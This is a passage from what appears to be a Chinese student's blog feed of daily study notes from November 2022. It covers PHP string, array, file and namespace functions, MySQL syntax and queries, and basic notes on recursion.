使用另一个字符串填充字符串为指定长度str_repeat — 重复一个字符串str_replace — 子字符串替换str_rot13 — 对字符串执行 ROT13 转换str_shuffle — 随机打乱一个字符串str_split — 将字符串转换为数组str_starts_with — Checks if a string starts with a given substringstr_word_count — 返回字符串中单词的使用情况strcasecmp — 二进制安全比较字符串（不区分大小写）strchr — 别名 strstrstrcmp — 二进制安全字符串比较strcoll — 基于区域设置的字符串比较strcspn — 获取不匹配遮罩的起始子字符串的长度strip_tags — 从字符串中去除 HTML 和 PHP 标记stripcslashes — 反引用一个使用 addcslashes 转义的字符串stripos — 查找字符串首次出现的位置（不区分大小写）stripslashes — 反引用一个引用字符串stristr — strstr 函数的忽略大小写版本strlen — 获取字符串长度strnatcasecmp — 使用“自然顺序”算法比较字符串（不区分大小写）strnatcmp — 使用自然排序算法比较字符串strncasecmp — 二进制安全比较字符串开头的若干个字符（不区分大小写）strncmp — 二进制安全比较字符串开头的若干个字符strpbrk — 在字符串中查找一组字符的任何一个字符strpos — 查找字符串首次出现的位置strrchr — 查找指定字符在字符串中的最后一次出现strrev — 反转字符串strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）strrpos — 计算指定字符串在目标字符串中最后一次出现的位置strspn — 计算字符串中全部字符都存在于指定字符集合中的第一段子串的长度。strstr — 查找字符串的首次出现strtok — 标记分割字符串strtolower — 将字符串转化为小写strtoupper — 将字符串转化为大写strtr — 转换指定字符substr_compare — 二进制安全比较字符串（从偏移位置比较指定长度）substr_count — 计算字串出现的次数substr_replace — 替换字符串的子串substr — 返回字符串的子串trim — 去除字符串首尾处的空白字符（或者其他字符）ucfirst — 将字符串的首字母转换为大写ucwords — 将字符串中每个单词的首字母转换为大写vfprintf — 将格式化字符串写入流vprintf — 输出格式化字符串vsprintf — 返回格式化字符串wordwrap — 打断字符串为指定数量的字串is_array 判断是否为数组count 数组的元素数目array_search — 在数组中搜索给定的值，如果成功则返回相应的键名array_key_exists()在给定的 key 存在于数组中时返回 TRUEarray_unshift()  将传入的单元插入到 array 数组的开头。注意单元是作为整体被插入的，因此传入单元将保持同样的顺序。所有的数值键名将修改为从零开始重新计数，所有的文字键名保持不变array_shift()  将array 的第一个单元移出并作为结果返回，将 array 的长度减一并将所有其它单元向前移动一位。所有的数字键名将改为从零开始计数，文字键名将不变。array_unique()  接受 array 作为输入并返回没有重复值的新数组。注意键名保留不变。 array_unique()  先将值作为字符串排序，然后对每个值只保留第一个遇到的键名，接着忽略所有后面的键名。这并不意味着在未排序的 array 中同一个值的第一个出现的键名会被保留。 in_array — 检查数组中是否存在某个值  如果找到指定的值则返回 TRUE，否则返回 FALSE 。in_array()是区分大小写的。PHP_EOL 为换行符</code></pre><p>部分实例</p><pre><code>$a=&#39;123456&#39;;echo $str.&quot; 一共有 &quot;.strlen($a).&quot;字符&quot;;//去掉空格echo trim($str);echo $str1;//查找字符串 返回位置echo strpos($str,&#39;暗月&#39;);//截取字符串echo substr($str,strpos($str,&#39;暗月&#39;),strpos($str,&#39;培训&#39;));//md5  加密echo md5($a);//通过下标 取字符的值echo $a[0];//字符串替换函数$a1=str_replace(&#39;1&#39;,&#39;0&#39;,$a);echo $a1;</code></pre><h4 id="具体的使用方法请查看手册"><a href="#具体的使用方法请查看手册" class="headerlink" title="具体的使用方法请查看手册"></a>具体的使用方法请查看手册</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;仔细收集php的常见字符操作函数&quot;&gt;&lt;a href=&quot;#仔细收集php的常见字符操作函数&quot; class=&quot;head</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221112</title>
    <link href="https://liu1272.github.io/2022/11/12/20221112/"/>
    <id>https://liu1272.github.io/2022/11/12/20221112/</id>
    <published>2022-11-12T05:48:00.000Z</published>
    <updated>2022-11-14T14:28:15.724Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="PHP超级全局变量"><a href="#PHP超级全局变量" class="headerlink" title="PHP超级全局变量"></a>PHP超级全局变量</h4><p>PHP超级全局变量列表：<br>$GLOBALS　　一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br>$_SERVER　　一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组<br>$_REQUEST　　用于收集HTML表单提交的数据。<br>它可以获取 cookie  get  post<br>$_POST　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”post”。<br>$_GET　　应用于收集表单数据，在HTML form标签的指定该属性：”method=”get”。<br>Array []<br>$_FILES　　<br>$_ENV　　<br>$_COOKIE　　<br>$_SESSION</p><h4 id="PHP-Include-文件"><a href="#PHP-Include-文件" class="headerlink" title="PHP Include 文件"></a>PHP Include 文件</h4><p>服务器端包含用于创建可在多个页面重复使用的函数、页眉、页脚或元素。</p><pre><code>将 PHP 文件的内容插入另一个 PHP 文件:include &#39;filename&#39;;require &#39;filename&#39;;错误处理方面:require 会生成致命错误（E_COMPILE_ERROR）并停止脚本include 只生成警告（E_WARNING），但脚本会继续</code></pre><h4 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h4><p>操作文件:<br>readfile() 函数读取文件，并把它写入输出缓冲。<br>文件打开/读取/关闭:<br>fopen(“AAA.txt”,”/r”)函数的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><p>打开模式详解:<br>r:打开只读文件，指针在文件开头<br>w:只写文件，如果不存在就删除或创建，指针在文件开头<br>a:只写文件，保留数据，指针在结尾，如果文件不存在就创建新文件<br>x:创建新文件为只写，如果文件存在就返回false和错误<br>r+:打开文件为读/写，指针在开头<br>w+:打开文件为读/写，如果不存在就创建或删除，指针在开头<br>a+:打开文件为读/写，保留数据，指针在结尾，如果不存在就创建新文件<br>x+:创建文件为读/写，如果文件已存在就返回false和错误</p><p>fread($文件名,filesize(“AAA.txt”));<br>第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数</p><p>fclose($文件名);<br>关闭打开的文件，节约服务器资源</p><p>fgets($文件名);<br>从文件读取单行，调用后，文件指针会移动到下一行。</p><p>feof($myfile);<br>检查是否已到达文件末尾(EOF)，常用于遍历未知长度的数据</p><p>fgetc($myfile);<br>从文件中读取单个字符，调用后，文件指针会移动到下一个字符。</p><p>fopen(“文件名”, “w”)；<br>如果用来打开不存在的文件，此函数会创建文件，假定文件被打开为写入（w）或增加（a）。</p><p>fwrite($文件名,要发送的字符串);<br>写入文件,会发生覆盖原数据</p><h4 id="文件的-复制-删除-重名"><a href="#文件的-复制-删除-重名" class="headerlink" title="文件的 复制 删除 重名"></a>文件的 复制 删除 重名</h4><p>php文件重命名：函数rename()。<br>php文件复制：函数copy();<br>php文件删除：函数unlink();</p><h4 id="获取文件属性"><a href="#获取文件属性" class="headerlink" title="获取文件属性"></a>获取文件属性</h4><pre><code>file_exists(string $filename)是否存在,返回false或trueis_file() 是否为文件,返回false或truefilesize() 文件大小,返回false或trueis_readable() 文件名是否可读,返回false或trueis_writable() 文件名是否可改,返回false或trueis_executable() 文件名是否可执行,返回false或truefilectime() 文件创建时间，返回UNX时间戳filemtime() 文件修改时间，返回UNX时间戳fileatime() 上次访问时间，返回UNX时间戳stat() 获取大部分属性值，返回包含文件信息的数组</code></pre><h4 id="PHP目录操作"><a href="#PHP目录操作" class="headerlink" title="PHP目录操作"></a>PHP目录操作</h4><p>新建目录：mkdir(路径，权限，递归创建)<br>删除目录：rmdir()<br>移动（改名）：rename()<br>获取目录内容：<br>//打开目录<br>目录句柄 = opendir()<br>//读取目录<br>文件名 = readdir(目录句柄)<br>依次读取文件名，同时向下移动文件句柄指针，读取不到则返回false<br>//关闭目录<br>closedir()</p><p>注:前目录. 上级目录用..</p><h4 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h4><p>定义：人为的将内存进行分隔<br>作用：让不同内存区域的同名结构共存<br>目的：解决重名结构问题<br>空间元素：函数，常量，类，不包括变量！！!<br>语法:<br>namespace 空间名<br>namespace 空间名\子空间</p><p>命名空间访问(url)<br>1.定名称访问：直接访问空间元素的名字（只访问自己命名空间的元素）<br>2.名称访问：使用自己当前的子空间名字+ \ + 元素名字<br>3.访问：\ + 全局空间 + \  +  元素名字<br>注：任何空间元素访问，只针对函数，类，常量，不包括变量！！!</p><p>全局空间(C盘)<br>如果定义了命名空间，非限定名称的寻找系统常量的方式：<br>首先,自己的空间内找<br>然后,果找不到元素<br>系统常量–&gt;进入全局空间寻找<br>系统类–&gt;不会自动进入全局空间寻找，而是会报错</p><pre><code>命名空间的引入1.空间引入方式：use关键字    (1)类：use 空间名\类名    (2)数：use function 空间名\函数名    (3)量：use const 空间名\常量名2.当引入元素时重名，通过 as 来起别名    use 空间名\类名 as 别名3.引入多个元素    use 空间名\&#123;        类名，        function 函数名，        const 常量    &#125;       4. 引入空间    use 空间名</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;PHP超级全局变量&quot;&gt;&lt;a href=&quot;#PHP超级全局变量&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221111</title>
    <link href="https://liu1272.github.io/2022/11/11/20221111/"/>
    <id>https://liu1272.github.io/2022/11/11/20221111/</id>
    <published>2022-11-11T08:28:00.000Z</published>
    <updated>2022-11-17T15:09:46.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><pre><code>文件1function add()&#123;    echo &#39;执行&#39;;&#125;add增加，del删除，update更改，select查询文件2include (&#39;文件1.php&#39;);          //调用文件add();                         //调用函数include与require区别include在没有这个文件时报错并执行，但是require报错但是不执行include_once与require_once区别可以重复调用文件，区别同上</code></pre><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><pre><code>索引数组:$arr=[1,2,3,4,5];var_dump($arr);或$arr=array(1,2,3,4,5);var_dump($arr);关联数组:$arr=[    &#39;A&#39;=&gt;&#39;a&#39;,    &#39;B&#39;=&gt;&#39;b&#39;;];var_dump($arr);二维(多维)数组:$arr=[    &#39;A&#39;=&gt;[        &#39;a&#39;,        &#39;b&#39;,        &#39;c&#39;,    ]];var_dump($arr);</code></pre><h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><p>增加:直接声明$arr[位置]=’内容’;<br>删除:unset($arr[位置]);<br>修改:重新定义<br>对于多维数组要var_dump($arr[第一层位置][第二层位置]…….);<br>获取循环次数:echo count($arr);</p><pre><code>遍历foreach ($arr as $key =&gt; $value) &#123;    echo $key.&#39;&lt;br/&gt;&#39;;&#125;list($a , $b , $c , $d , $e) = $arr;echo $a,$b,$c,$d;一一赋值，多出来的跳过，只对有索引的有效while (list($key , $val) = each($arr)) &#123;    echo $key.&#39;--&#39;.$val.&#39;&lt;br/&gt;&#39;;&#125;排序sort() - 对数组进行升序排列rsort() - 对数组进行降序排列asort() - 根据关联数组的值，对数组进行升序排列ksort() - 根据关联数组的键，对数组进行升序排列arsort() - 根据关联数组的值，对数组进行降序排列krsort() - 根据关联数组的键，对数组进行降序排列数组的合拼$array1 =array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);$array2 = array(&#39;a1&#39;=&gt;&#39;php&#39;,&#39;a2&#39;=&gt;&#39;python&#39;,&#39;a3&#39;=&gt;&#39;java&#39;);$array3 = array_merge($array1,$array2);添加到指定位置array_splice(数组，位置，删除几个，增加元素）</code></pre><h4 id="超全局数组"><a href="#超全局数组" class="headerlink" title="超全局数组"></a>超全局数组</h4><p>配合html前端页面method=’get/post’<br>var_dump($_GET);获取GET的参(显示内容在URL)<br>var_dump($_POST);获取POST的参(不显示)<br>var_dump($_REQUEST);都可以获取<br>前端name所设置的会把参数传到后端<br>name=’username’<br>$username=$_GET[‘username’];</p><h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><pre><code>notice注意                   //后续代码会继续执行warning警告                  //后续代码会继续执行fatal error致命错误          //后续代码不会继续执行@可以消除警报(除了fatal error)在ini配置文件里display_errors:On可以取消报错(所有)在ini配置文件里error_log找错误日志</code></pre><h4 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h4><p>时间戳:时间戳是从1970年1月1日（UTC/GMT的午夜）开始所经过的秒数，不考虑闰秒。<br>配置文件可改时区，不详细讲</p><h4 id="数据库简介-dos操作"><a href="#数据库简介-dos操作" class="headerlink" title="数据库简介(dos操作)"></a>数据库简介(dos操作)</h4><pre><code>对数据库的解释:数据库相当于文件夹，表相当于文件，字段就是内容。注释符:#    &quot;--  &quot;    /* */&lt;不是内部命令就更改环境变量&gt;【库操作】连接数据库:mysql -uroot -p查库:show databases;建库creat database 库名;删库drop database 库名;退出mysql &gt; exit;mysql &gt; quit;mysql &gt; \q;重命名数据库RENAME database olddbname TO newdbname【表操作】进库:use 库名;建表:creat table 表名(id int,字段名 数据类型(长度) , 字段名 数据类型(位数));建表命令:show creat table 表名;改表名:alter table 原表名 rename 新名字查表:show tables;select * from table_name删表:drop table 表名;查表结构:desc 表名;                      //字段类型，主键，是否为空等属性，但不显示外键【字段操作】建表字段:alter table 表名 add 字段名 (字段类型)改表字段:alter table 表名 change 原来的字段名 现在的字段名 数据类型(位数);改表字段值:alter table 表名 modify 字段名 修改后的值删表字段:alter table 表名 drop 字段名更改表的存储引擎:alter table 表名 engine=存储引擎名;给所有字段增加数据:insert into users (字段名1,字段名2,字段名3)values(值1,值2,值3);【插入顺序】first    alter table 表名 add 字段(字段类型) firstafter    alter table 表名 add 字段名(字段类型) after (在谁后面)【其它命令】显示系统特定资源的信息show status;                   //例如，正在运行的线程数量。</code></pre><h4 id="mysql数据类型"><a href="#mysql数据类型" class="headerlink" title="mysql数据类型"></a>mysql数据类型</h4><p>整形:<br>int4字节，bigint8字节<br>浮点型:<br>float(m,d)<br>double(m,d)<br>decimal(m,d)<br>字符型:<br>char定长字符串(常用于32位md5密码)<br>varchar变长字符串(常用于用户名)<br>时间型:<br>4字节，年月日格式<br>auto_increment:<br>自动增加，只用于整形，priimary&emsp;key设置起始值(默认为1)<br><a href="https://www.cnblogs.com/-xlp/p/8617760.html">总结内容</a></p><h5 id="以上内容皆可使用phpMyAdmin和NavicatPremium更改"><a href="#以上内容皆可使用phpMyAdmin和NavicatPremium更改" class="headerlink" title="以上内容皆可使用phpMyAdmin和NavicatPremium更改"></a>以上内容皆可使用phpMyAdmin和NavicatPremium更改</h5><h4 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h4><pre><code>普通索引:alter table 表名 add index(字段);唯一索引:alter table 表名 add unique(字段);主键索引:alter table 表名 add primary key(字段);全文索引:alter table 表名 add fulltext(字段);显示索引:show index from 字段名</code></pre><p><a href="https://blog.csdn.net/qq_35190492/article/details/109257302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166808686716782428672275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166808686716782428672275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-109257302-null-null.142%5Ev63%5Ejs_top,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=mysql%E7%B4%A2%E5%BC%95&spm=1018.2226.3001.4187">使用及区别</a></p><h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><pre><code>select选择时如果要限制条件就在后面加上where和条件where age&lt;&gt;50; == where age!50                     //取非age in(18,16,17);                                  //固定查询的值address like &#39;Ax&#39;;                                 //模糊查询A开头的address like &#39;xAx&#39;;                                //模糊查询含A的select * from 表名 order by 列名 desc;             //降序显示，默认为升序(asc)select * from 表名 limit 5,5;                      //从第五个值开始往下取5个值select * from 表名 group by 列名;                  //分组(只保留一个，去重)select count(*) from 表名;                         //显示该列有几个数据select 列名 as 别名 from 表名;                     //给该列起别名注意:and优先级高于or，因此先计算and表达式再运算or表达式聚合查询:count()返回行数sum()返回某列值的和avg()返回某列平均值max()返回某列最大值min()返回某列最小值分组查询:select * from 表名 group by 字段名;select * from 表名 limit 开始行数,结束行数;select * from 表名 as 重命名;mysql子查询:类似于嵌套循环，将内层的结果传递到外层进行下一步操作大致有:where,from,exists三个联合查询(两个表的查询):原理——————取得两个结果集的并集union默认选取不同的值。如果允许重复的值，请使用union all(不会去掉结果中的重复行)union all 查询全部而且不会消除重复的行</code></pre><h4 id="查询数据库"><a href="#查询数据库" class="headerlink" title="查询数据库"></a>查询数据库</h4><pre><code>内联查询:select 列名1 from 表名1 inner join 表名2 on 条件;左连接查询(以左边为基准):select 列名1 from 表名1 left join 表名2 on 条件;右链接查询(左边没有的不会显示):select 列名1 from 表名1 right join 表名2 on 条件;嵌套查询:不建议，太慢</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog"><a href="#双十一被学校关在宿舍饲养-不用走到哪都吃狗粮真是太开心了-dog" class="headerlink" title="双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)"></a>双十一被学校关在宿舍饲养,不用走到哪都吃狗粮真是太开心了(dog)</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h4 id=&quot;文件包含&quot;&gt;&lt;a href=&quot;#文件包含&quot; class=&quot;headerlink&quot; title=&quot;文件包含&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221110</title>
    <link href="https://liu1272.github.io/2022/11/10/20221110/"/>
    <id>https://liu1272.github.io/2022/11/10/20221110/</id>
    <published>2022-11-10T10:09:00.000Z</published>
    <updated>2022-11-14T08:33:49.113Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="开始学习PHP"><a href="#开始学习PHP" class="headerlink" title="开始学习PHP"></a>开始学习PHP</h5><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>PHP是超文本预处理器<br>运行在服务器端，内嵌在html脚本语言<br>由wampserver等集成环境，有mysql数据库和apache服务<br>使用localhost或127.0.0.1访问<br>写入的php文件一定要放在www目录下</p><h4 id="php信息"><a href="#php信息" class="headerlink" title="php信息"></a>php信息</h4><p>phpinfo();显示所有php的信息<br>php.ini配置文件</p><h4 id="PHP文件格式"><a href="#PHP文件格式" class="headerlink" title="PHP文件格式"></a>PHP文件格式</h4><pre><code>&lt;?php              //大小写都可以代码部分除最后一行以外每行结尾都要以;结尾?&gt;可以不写php但是要改ini配置文件的short_open_tag=On,要重启</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>$变量名(不能是数字或特殊符号开头，可以是中文，建议驼峰命名法)=’value’;<br>echo “$变量名”;        //输出上面传入的值</p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><pre><code>单引号:如果里面有变量都作为一个字符串处理双引号:里面有变量会输出变量的值尽量使用单引号————效率高//单行注释/* */多行注释&quot;\n&quot;换行(双引号解释转义字符，单引号不解释)\r和\t同上&#39;\\&#39;时输出\&#39;\&#39;&#39;时输出&#39;因为\将后面的转义成没意义的字符变量和字符串之间用.连接，而且要&#39;将字符串包起来双引号中插入单引号，单引号再插入变量时，变量会解析成&#39;value&#39;双引号中插入变量时在变量后面加空格或,echo __FILE__;输出文件地址echo __LINE__;输出行号echo __DIR__;输出当前文件的文件夹的路径echo PHP_VERSION;获取php版本号echo __FUNCTION__;输出函数名false的情况:空字符串，0，空数组，null</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>&lt;分类&gt;标量    浮点类型:float    整数型:int    布尔型:boolean    字符串:string(只要是引号包起来的)混合类型    数组:array    对象:object特殊类型    空:null     资源:resourse    &lt;转换&gt;intval()转整形floatval()转浮点型strval()转字符串boolval()转布尔型&lt;注&gt;空转整形为0空转浮点型变成浮点型的0空转字符串变成空字符串整形后面有字符串会清除字符串保留前面的数字浮点型后面有字符串会清除字符串保留前面的全部数字&lt;判断&gt;is_array();is_string()is_bool();is_float();is_int();is_object();is_numeric();is_resource();is_null();is_scalar();判断标量gettype();只获取类型var_dump();输出值和类型PHP中提供四种整形的定义方式，十进制定义，二进制定义，八进制定义和十六进制定义$a = 120 //十进制$a = 0b110 //二进制$a = 0120     //八进制$a = 0x120    //十六进制// 使用echo输出时。默认输出为十进制decbin() // 十进制转二进制decoct() // 十进制转八进制dechex() // 十进制转十六进制bindec() // 二进制转十进制bin2hex() //二进制转十六进制    字符串：字符串变量用于存储并处理文本。</code></pre><h4 id="系统常量"><a href="#系统常量" class="headerlink" title="系统常量"></a>系统常量</h4><p>定义:<br>define(‘常量名字’,’常量值————必须是常量’);<br>变量可重新定义，使用的变量必须在上面定义<br>defind(A);判断A是否已经被定义了</p><pre><code>使用 define() 函数设置常量:bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )　　该函数有三个参数:name：必选参数，常量名称，即标志符。value：必选参数，常量的值。case_insensitive ：可选参数，如果设置为 TRUE，该常量则大小写不敏感。默认是大小写敏感的。&lt;?php // 常量define(&quot;CL&quot;, &quot;这是一个全局常量&quot;, true);echo CL; // 默认false，变量名区分大小写echo cl; // true不区分大小写?&gt;预定义常量PHP预定义了许多常量，这些常量无需使用define()函数定义，可直接在程序中使用。下面列举了一些常用的PHP预定义常量。（1）__FILE__(FILE前后分别是两个下画线)：当前正在处理的脚本文件名，若使用在一个被引用的文件中（include或require），那么　　它的值就是被引用的文件，而不是引用它的那个文件。（2）__LINE__(LINE前后分别是两个下画线)：正在处理的脚本文件的当前行数。（3）PHP_VERSION：当前PHP预处理器的版本，如5.4.16。（4）PHP_OS: PHP所在的操作系统的类型。如Linux。（5）TRUE：表示逻辑真。FALSE：表示逻辑假。NULL：表示没有值或值不确定。（6）DIRECTORY_SEPARATOR: 表示目录分隔符，UNIX或Linux操作系统环境时的值为“ / ”, Window操作系统环境时的值为 “ \ ”。</code></pre><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><pre><code>算术运算符:+   -   *   /   %赋值运算符:=   +=   -=   /+   %=   .=自增自减运算符:++   --   比较运算符:&lt;   &gt;   &gt;=   &lt;=   ==   ===   !=(仅看值)   !==(看值和数据类型)   &lt;&gt;(相当于!=)逻辑运算符:&amp;&amp;   ||   !(真假反转)静态变量:static 放在函数体内，只会初始化一次变量，以后运行会记录上一次的值预递增++x         //先加再返回预递减--x         //先减再返回后递增x++         //先返回再加后递减x--         //先返回再减非!               //不是true就返回true或or/||           //一个true就true与and/&amp;&amp;          //都true才true异或xor           //有且仅有一个true才是true三元运算符:(expr1) ? (expr2) : (expr3)</code></pre><h4 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h4><pre><code>&lt;单分支&gt;if (条件) &#123;         //真区间;&#125; else &#123;         //假区间;&#125;后续代码;&lt;多分支&gt;switch (条件) &#123;    case 判断条件1 :    case 判断条件2 :    case 判断条件3 :        echo 执行1 ;        break;    case 判断条件4 :        echo 执行2 ;        break;    default:        echo 执行3 ;      //否则        break;&#125;if (条件判断1) &#123;    echo 执行1 ;&#125; else if (条件判断2) &#123;    echo 执行2 ;&#125; else if (条件判断3) &#123;    echo 执行3 ;&#125; else &#123;    echo 执行4 ;&#125;</code></pre><h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><pre><code>for (初始条件;条件判断;执行A) &#123;       //程序进行从初始条件开始逆时针    echo 执行B ;&#125;——————————————————————————————————————————————————————————————————————————————while (条件判断) &#123;    echo 执行 ;&#125;——————————————————————————————————————————————————————————————————————————————do &#123;    echo 执行 ;&#125; while (条件判断);     //成立才接着循环——————————————————————————————————————————————————————————————————————————————continue从下一次循环语句开始break终止循环语句</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><pre><code>function 函数名 (设置参数$...=...) &#123;    echo 执行;    return 1;       //只返回不输出&#125;函数名 ();上面这样return的1是不会输出的，要输出就要在调用函数前echo函数可以在任何位置调用，但是变量不能在上面调用函数可以调用多次函数体内声明的变量是局部变量，否则是全局变量两者互不污染，同时局部变量与垃圾回收机制有关$_GET $_POST $_COOKIE $_SESSION $GLOBALS  超全局变量(统一内外变量)约束形参:function sum (int $num1 , int $num2)&#123;    return $num1 + $num2;&#125;(sum(&#39;2.3&#39;,3));约束返回值:function sum (int $num1 , int $num2):string&#123;    return $num1 + $num2;&#125;(sum(4,5));php7.0新特性:使用  ...$函数名  来将数组里的值一一给形参赋值匿名函数:将一个没有函数名的函数赋值给一个变量并调用(就是没有名字的函数)static的关键字的使用: * 当一个函数完成时，它的所有变量通常都会被删除。 * 然而，有时候您希望某个局部变量不要被删除。 * 要做到这一点，请在您第一次声明变量时使用 static 关键字：function test()&#123;    static $n=0;    $n++;    echo &quot;调用了一次&quot;.$n.&quot;\n&quot;;&#125;test();test();test();?&gt;</code></pre><h4 id="PHP变量作用域"><a href="#PHP变量作用域" class="headerlink" title="PHP变量作用域"></a>PHP变量作用域</h4><p>PHP 有三种不同的变量作用域：<br>local（局部）:函数内部声明的变量只能在函数内部进行访问<br>global（全局）:函数之外声明的变量只能在函数以外进行访问<br>static（静态）:静态变量仅在局部函数域中存在，当函数执行离开此作用域时，其值不会消失(例如拿来判断循环退出的变量)<br>内部函数想要引用外部变量可以引入global关键字global $outer;<br>注释：static变量仍然是函数的局部变量</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>查手册</p><h4 id="书写建议"><a href="#书写建议" class="headerlink" title="书写建议"></a>书写建议</h4><p>能加空格就加</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;开始学习PHP&quot;&gt;&lt;a href=&quot;#开始学习PHP&quot; class=&quot;headerlink&quot; title=&quot;开始学</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>20221109</title>
    <link href="https://liu1272.github.io/2022/11/09/20221109/"/>
    <id>https://liu1272.github.io/2022/11/09/20221109/</id>
    <published>2022-11-09T05:08:00.000Z</published>
    <updated>2022-11-10T07:26:59.197Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><p>递归:调用函数时调用自身<br>最大的嵌套调用次数（包括首次）被称为 递归深度。</p><p>两种思考方式:<br>1.迭代思路：使用 for 循环<br>2.递归思路：简化任务，调用自身</p><h4 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h4><p>堆和栈是cpu的两个部分，栈用于存储数据，堆<br>遵守先入后出原则，存入数据是压栈，放出数据叫弹栈POP(内存的数据不删除，但是放入回收站)<br>如果只入不出(没有return)就会栈溢出，导致程序错误<br>执行上下文和堆栈:<br>执行上下文是一个内部数据结构，它包含有关函数执行时的详细细节：当前控制流所在的位置，当前的变量，this 的值（此处我们不使用它），以及其它的一些内部细节。<br>一个函数调用仅具有一个与其相关联的执行上下文。</p><p>函数进行嵌套调用时:</p><pre><code>当前函数被暂停；1.与它关联的执行上下文被一个叫做 执行上下文堆栈 的特殊数据结构保存；2.执行嵌套调用；3.嵌套调用结束后，从堆栈中恢复之前的执行上下文，并从停止的位置恢复外部函数。</code></pre><h4 id="Rest-参数与-Spread-语法"><a href="#Rest-参数与-Spread-语法" class="headerlink" title="Rest 参数与 Spread 语法"></a>Rest 参数与 Spread 语法</h4><p>当我们在代码中看到 “…” 时，它要么是 rest 参数，要么是 spread 语法。<br>有一个简单的方法可以区分它们：<br>若 … 出现在函数参数列表的最后，那么它就是 rest 参数，它会把参数列表中剩余的参数收集到一个数组中。<br>若 … 出现在函数调用或类似的表达式中，那它就是 spread 语法，它会把一个数组展开为列表。<br>使用场景：<br>Rest 参数用于创建可接受任意数量参数的函数。<br>Spread 